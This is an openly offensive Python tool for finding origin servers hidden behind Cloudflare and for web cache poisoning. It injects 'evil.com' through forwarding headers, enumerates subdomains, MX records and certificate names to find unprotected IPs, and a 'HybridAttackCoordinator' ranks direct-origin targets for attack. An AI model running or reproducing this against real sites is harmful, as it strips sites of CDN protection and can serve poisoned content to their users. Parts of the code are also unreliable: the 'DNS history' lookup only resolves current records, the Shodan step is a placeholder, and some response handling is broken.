"""
Cache Poisoning & Origin Discovery - 2026
Advanced techniques for CDN cache manipulation and origin server discovery.
"""
import asyncio
import socket
import ssl
import dns.resolver
import dns.query
import dns.zone
from typing import Dict, List, Optional, Set, Tuple
from dataclasses import dataclass
import ipaddress
import re
from urllib.parse import urlparse


@dataclass
class OriginServer:
    """Discovered origin server information."""
    ip: str
    port: int
    confidence: float
    method: str
    response_time: float
    headers: Dict[str, str]


class CachePoisoning:
    """Cache poisoning techniques for CDN bypass."""
    
    @staticmethod
    def generate_cache_busters() -> List[Dict[str, str]]:
        """Generate cache-busting parameters that bypass CDN but hit origin."""
        return [
            # Query parameter variations
            {'_': str(int(asyncio.get_event_loop().time() * 1000))},
            {'nocache': '1', 'rand': str(hash(asyncio.get_event_loop().time()))},
            {'v': str(int(asyncio.get_event_loop().time()))},
            
            # Header variations that bypass cache
            {'X-Forwarded-Host': 'bypass.local'},
            {'X-Original-URL': '/admin'},
            {'X-Rewrite-URL': '/internal'},
            
            # HTTP method variations
            {'method': 'PURGE'},
            {'method': 'TRACE'},
        ]
    
    @staticmethod
    def generate_poisoned_headers() -> Dict[str, str]:
        """Generate headers that can poison CDN cache."""
        return {
            'X-Forwarded-For': '127.0.0.1',
            'X-Forwarded-Host': 'evil.com',
            'X-Host': 'evil.com',
            'X-Original-URL': '/',
            'X-Rewrite-URL': '/',
            'Forwarded': 'for=127.0.0.1;host=evil.com',
            'True-Client-IP': '127.0.0.1',
            'X-Real-IP': '127.0.0.1',
            'CF-Connecting-IP': '127.0.0.1',
        }
    
    @staticmethod
    async def test_cache_poisoning(url: str, session) -> Dict:
        """Test if cache poisoning is possible."""
        results = {
            'vulnerable': False,
            'methods': [],
            'poisoned_keys': []
        }
        
        poisoned_headers = CachePoisoning.generate_poisoned_headers()
        
        for header_name, header_value in poisoned_headers.items():
            try:
                # First request with poison
                resp1 = await session.get(url, headers={header_name: header_value})
                cache_key1 = resp1.headers.get('X-Cache-Key', '')
                
                # Second request without poison
                resp2 = await session.get(url)
                cache_key2 = resp2.headers.get('X-Cache-Key', '')
                
                # Check if poison affected cache
                if cache_key1 and cache_key1 == cache_key2:
                    if header_value in resp2.text:
                        results['vulnerable'] = True
                        results['methods'].append(header_name)
                        results['poisoned_keys'].append(cache_key1)
            except Exception:
                continue
        
        return results


class OriginDiscovery:
    """Advanced origin server discovery techniques."""
    
    def __init__(self, target_domain: str):
        self.domain = target_domain
        self.discovered_ips: Set[str] = set()
        self.cloudflare_ranges = self._load_cloudflare_ranges()
    
    def _load_cloudflare_ranges(self) -> List[ipaddress.IPv4Network]:
        """Load known Cloudflare IP ranges."""
        cf_ranges = [
            '173.245.48.0/20', '103.21.244.0/22', '103.22.200.0/22',
            '103.31.4.0/22', '141.101.64.0/18', '108.162.192.0/18',
            '190.93.240.0/20', '188.114.96.0/20', '197.234.240.0/22',
            '198.41.128.0/17', '162.158.0.0/15', '104.16.0.0/13',
            '104.24.0.0/14', '172.64.0.0/13', '131.0.72.0/22'
        ]
        return [ipaddress.IPv4Network(r) for r in cf_ranges]
    
    def is_cloudflare_ip(self, ip: str) -> bool:
        """Check if IP belongs to Cloudflare."""
        try:
            ip_obj = ipaddress.IPv4Address(ip)
            return any(ip_obj in network for network in self.cloudflare_ranges)
        except Exception:
            return False
    
    async def dns_history_lookup(self) -> List[str]:
        """Query DNS history databases for old IPs."""
        ips = []
        
        try:
            # Current DNS resolution
            resolver = dns.resolver.Resolver()
            resolver.timeout = 5
            resolver.lifetime = 5
            
            answers = resolver.resolve(self.domain, 'A')
            for rdata in answers:
                ip = str(rdata)
                if not self.is_cloudflare_ip(ip):
                    ips.append(ip)
        except Exception:
            pass
        
        return ips
    
    async def subdomain_enumeration(self) -> List[str]:
        """Enumerate subdomains to find origin IPs."""
        ips = []
        common_subdomains = [
            'www', 'mail', 'ftp', 'admin', 'cpanel', 'webmail',
            'direct', 'origin', 'backend', 'api', 'dev', 'staging',
            'test', 'old', 'new', 'backup', 'db', 'mysql', 'postgres'
        ]
        
        resolver = dns.resolver.Resolver()
        resolver.timeout = 3
        resolver.lifetime = 3
        
        for subdomain in common_subdomains:
            try:
                full_domain = f"{subdomain}.{self.domain}"
                answers = resolver.resolve(full_domain, 'A')
                for rdata in answers:
                    ip = str(rdata)
                    if not self.is_cloudflare_ip(ip):
                        ips.append(ip)
            except Exception:
                continue
        
        return ips
    
    async def ssl_certificate_scan(self) -> List[str]:
        """Scan SSL certificates for origin IPs via SNI."""
        ips = []
        
        try:
            # Get all IPs for domain
            resolver = dns.resolver.Resolver()
            answers = resolver.resolve(self.domain, 'A')
            
            for rdata in answers:
                ip = str(rdata)
                try:
                    # Connect and get certificate
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    
                    with socket.create_connection((ip, 443), timeout=5) as sock:
                        with context.wrap_socket(sock, server_hostname=self.domain) as ssock:
                            cert = ssock.getpeercert()
                            
                            # Extract SANs (Subject Alternative Names)
                            if cert and 'subjectAltName' in cert:
                                for san_type, san_value in cert['subjectAltName']:
                                    if san_type == 'DNS':
                                        # Try to resolve SAN domains
                                        try:
                                            san_answers = resolver.resolve(san_value, 'A')
                                            for san_rdata in san_answers:
                                                san_ip = str(san_rdata)
                                                if not self.is_cloudflare_ip(san_ip):
                                                    ips.append(san_ip)
                                        except Exception:
                                            continue
                except Exception:
                    continue
        except Exception:
            pass
        
        return ips
    
    async def mx_record_correlation(self) -> List[str]:
        """Find origin via MX record IP correlation."""
        ips = []
        
        try:
            resolver = dns.resolver.Resolver()
            mx_records = resolver.resolve(self.domain, 'MX')
            
            for mx in mx_records:
                mx_host = str(mx.exchange).rstrip('.')
                try:
                    mx_answers = resolver.resolve(mx_host, 'A')
                    for rdata in mx_answers:
                        ip = str(rdata)
                        # Check if same subnet as potential origin
                        if not self.is_cloudflare_ip(ip):
                            ips.append(ip)
                except Exception:
                    continue
        except Exception:
            pass
        
        return ips
    
    async def http_header_leakage(self) -> List[str]:
        """Find origin IPs leaked in HTTP headers."""
        ips = []
        
        try:
            import aiohttp
            async with aiohttp.ClientSession() as session:
                url = f"https://{self.domain}"
                
                # Try various endpoints that might leak origin
                endpoints = ['/', '/robots.txt', '/sitemap.xml', '/.well-known/security.txt']
                
                for endpoint in endpoints:
                    try:
                        async with session.get(url + endpoint, timeout=5) as resp:
                            # Check for origin IP in headers
                            headers_to_check = [
                                'X-Origin-IP', 'X-Real-IP', 'X-Forwarded-For',
                                'X-Backend-Server', 'X-Server-IP', 'Via'
                            ]
                            
                            for header in headers_to_check:
                                value = resp.headers.get(header, '')
                                # Extract IPs from header value
                                ip_pattern = r'\b(?:\d{1,3}\.){3}\d{1,3}\b'
                                found_ips = re.findall(ip_pattern, value)
                                for ip in found_ips:
                                    if not self.is_cloudflare_ip(ip):
                                        ips.append(ip)
                    except Exception:
                        continue
        except Exception:
            pass
        
        return ips
    
    async def shodan_censys_lookup(self) -> List[str]:
        """Simulate Shodan/Censys lookup for origin discovery."""
        # Note: This is a placeholder. Real implementation would use APIs
        # For now, we'll use passive techniques
        ips = []
        
        # Check for common origin patterns
        common_origins = [
            f"origin.{self.domain}",
            f"direct.{self.domain}",
            f"backend.{self.domain}",
        ]
        
        resolver = dns.resolver.Resolver()
        for origin_domain in common_origins:
            try:
                answers = resolver.resolve(origin_domain, 'A')
                for rdata in answers:
                    ip = str(rdata)
                    if not self.is_cloudflare_ip(ip):
                        ips.append(ip)
            except Exception:
                continue
        
        return ips
    
    async def discover_all(self) -> List[OriginServer]:
        """Run all discovery methods and return results."""
        all_ips = []
        
        # Run all discovery methods
        methods = [
            ('dns_history', self.dns_history_lookup()),
            ('subdomain_enum', self.subdomain_enumeration()),
            ('ssl_cert', self.ssl_certificate_scan()),
            ('mx_correlation', self.mx_record_correlation()),
            ('http_headers', self.http_header_leakage()),
            ('shodan', self.shodan_censys_lookup()),
        ]
        
        results = await asyncio.gather(*[method[1] for method in methods], return_exceptions=True)
        
        for i, result in enumerate(results):
            if isinstance(result, list):
                method_name = methods[i][0]
                for ip in result:
                    all_ips.append((ip, method_name))
        
        # Verify discovered IPs
        verified_origins = []
        unique_ips = list(set([ip for ip, _ in all_ips]))
        
        for ip in unique_ips:
            origin = await self._verify_origin(ip)
            if origin:
                verified_origins.append(origin)
        
        return verified_origins
    
    async def _verify_origin(self, ip: str) -> Optional[OriginServer]:
        """Verify if IP is actual origin server."""
        try:
            import aiohttp
            start_time = asyncio.get_event_loop().time()
            
            async with aiohttp.ClientSession() as session:
                # Try direct connection to IP
                url = f"http://{ip}"
                headers = {'Host': self.domain}
                
                async with session.get(url, headers=headers, timeout=5) as resp:
                    response_time = asyncio.get_event_loop().time() - start_time
                    
                    # Check if response looks like origin
                    if resp.status == 200:
                        return OriginServer(
                            ip=ip,
                            port=80,
                            confidence=0.8,
                            method='direct_http',
                            response_time=response_time,
                            headers=dict(resp.headers)
                        )
        except Exception:
            pass
        
        return None


class HybridAttackCoordinator:
    """Coordinate cache poisoning and origin attacks."""
    
    def __init__(self, target_url: str):
        self.target_url = target_url
        parsed = urlparse(target_url)
        self.domain = parsed.netloc
        self.origin_discovery = OriginDiscovery(self.domain)
    
    async def execute_hybrid_attack(self) -> Dict:
        """Execute coordinated cache poisoning + origin attack."""
        results = {
            'cache_poisoning': {},
            'origin_servers': [],
            'attack_vectors': []
        }
        
        # Discover origin servers
        origins = await self.origin_discovery.discover_all()
        results['origin_servers'] = [
            {'ip': o.ip, 'confidence': o.confidence, 'method': o.method}
            for o in origins
        ]
        
        # Test cache poisoning
        try:
            import aiohttp
            async with aiohttp.ClientSession() as session:
                poison_results = await CachePoisoning.test_cache_poisoning(
                    self.target_url, session
                )
                results['cache_poisoning'] = poison_results
        except Exception as e:
            results['cache_poisoning'] = {'error': str(e)}
        
        # Generate attack vectors
        if origins:
            results['attack_vectors'].append({
                'type': 'direct_origin',
                'targets': [o.ip for o in origins],
                'priority': 'high'
            })
        
        if results['cache_poisoning'].get('vulnerable'):
            results['attack_vectors'].append({
                'type': 'cache_poisoning',
                'methods': results['cache_poisoning']['methods'],
                'priority': 'medium'
            })
        
        return results
